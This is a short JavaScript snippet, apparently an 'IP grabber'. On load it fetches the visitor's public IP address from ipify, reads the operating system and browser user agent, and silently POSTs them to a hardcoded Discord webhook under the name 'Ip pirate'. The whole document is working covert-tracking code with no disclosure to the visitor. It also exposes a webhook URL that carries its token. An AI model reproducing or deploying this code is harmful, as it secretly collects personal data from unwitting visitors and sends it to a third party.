
async function getDataFromApi(URL) {
    
    const response = await fetch(URL);
    var OS = navigator.platform;
    var Browser = navigator.userAgent;     
    var data = await response.json();
        
    const request = new XMLHttpRequest();
    request.open("POST", "https://discordapp.com/api/webhooks/997797931606347798/OzvLuWfU7fBdbzMsJkl_OwXN2TiKkxiqWmpFyU-bnPU9CWgaexG_uiod23QuY7NMeT0F");

    request.setRequestHeader('Content-type', 'application/json');

    const params = {
        username: "Ip pirate",
        avatar_url: "",
        content: `Operating System: ${OS}, Browser: ${Browser}, ip: ${data.ip}`
    }
    request.send(JSON.stringify(params));
}

getDataFromApi('https://api.ipify.org/?format=json');
